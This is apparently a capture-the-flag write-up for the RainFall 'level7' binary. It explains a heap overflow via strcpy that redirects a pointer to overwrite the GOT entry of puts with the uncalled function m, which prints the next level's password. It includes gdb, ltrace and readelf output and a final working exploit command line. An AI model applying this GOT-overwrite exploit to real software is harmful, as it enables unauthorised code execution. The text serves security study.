# level7
The program has buffer overflow vulnerability.
- It segaults when `argv[2]` doesn't exist.
- It segfaults when `argv[1]` is too long.


Four sections in the program:

- It copies `argv[1]` and `argv[2]` using `strcpy` into two  allocated memory blocks of 8 bytes each, without checking the size of the input.

- The program reads the aimed flag file with `fopen` and `fgets`, then store the content (the flag) in a global string named `c`.

- At the end, it prints a useless message  with `puts("~~")`

- A function `m` prints the content of `c` but is never called.

## Goal
Overflow the allocated memory with `strcpy` to call `m()` instead of `puts()` by changing the address of `puts` by `m` in the __GOT__.

## Step 1
The program SEGFAULTS when `argv[1]` is too long.


```console
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A youhouu
Starting program: /home/user/level7/level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A youhouu

Program received signal SIGSEGV, Segmentation fault.
0xb7eb8f82 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb)
```
- `0xb7eb8f82` is not a segment of the pattern.  

- Deduction : The overflow doen'st overwrites the next instruction pointer `eip`.

---

Info registers
```console
(gdb) i r
eax            0x68756f79	1752526713
ecx            0xbffff8e0	-1073743648
edx            0x37614136	929120566
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff69c	0xbffff69c
ebp            0xbffff6c8	0xbffff6c8
esi            0x0	0
edi            0x0	0
eip            0xb7eb8f82	0xb7eb8f82
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

It overwrites `eax` and `edx`

## Step 2
Go deeper

```bash
level7@RainFall:~$ ltrace ./level7 AAAA ok
```

```console
__libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                                     = 0x0804a008
malloc(8)                                                                                                     = 0x0804a018
malloc(8)                                                                                                     = 0x0804a028
malloc(8)                                                                                                     = 0x0804a038
strcpy(0x0804a018, "AAAA")                                                                                    = 0x0804a018
strcpy(0x0804a038, "ok")                                                                                      = 0x0804a038
fopen("/home/user/level8/.pass", "r")                                                                         = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
`argv[1]` is copied at `0x0804a018`: "AAAA"  
`argv[2]` is copied at `0x0804a038`: "ok"

---

```bash
level7@RainFall:~$ ltrace ./level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH ok
```

```console
__libc_start_main(0x8048521, 3, 0xbffff7a4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                                     = 0x0804a008
malloc(8)                                                                                                     = 0x0804a018
malloc(8)                                                                                                     = 0x0804a028
malloc(8)                                                                                                     = 0x0804a038
strcpy(0x0804a018, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH")                                                        = 0x0804a018
strcpy(0x46464646, "ok" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
The destination of the second `strcpy` is overwritten when `argv[1]` is greater than 20 bytes.

### Solution
Since the destination of the second `strcpy` can be overwritten, We have to replace the destination by the location of `puts` in the __GOT__.  

Then, we can change the value at the location of `puts` in the __GOT__ by the address of `m` function. (The PLT will still link the binary call to the `puts` entry in the __GOT__)

> Remember: The GOT is an  address table of the dependencies. 

## Step 3
Find the address of `m`
```bash
(gdb) info function
```
```console
All defined functions:

Non-debugging symbols:
0x080484f4  m
0x08048521  main
```

`m` is at `0x080484f4`

## Step 4
Find the location in the __GOT__ where the address of `puts` is stored.
```bash
readelf -r level7
```
```console
08049928  00000607 R_386_JUMP_SLOT   00000000   puts
```

Address of `puts` is at `0x08049928` in the __GOT__.

### Verification
```console
(gdb) disas main
[...]
0x080485f7 <+214>:	call   0x8048400 <puts@plt>
[...]
(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x08048406
```


## Exploit
```bash
/home/user/level7/level7 $(python -c 'print "\x90" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```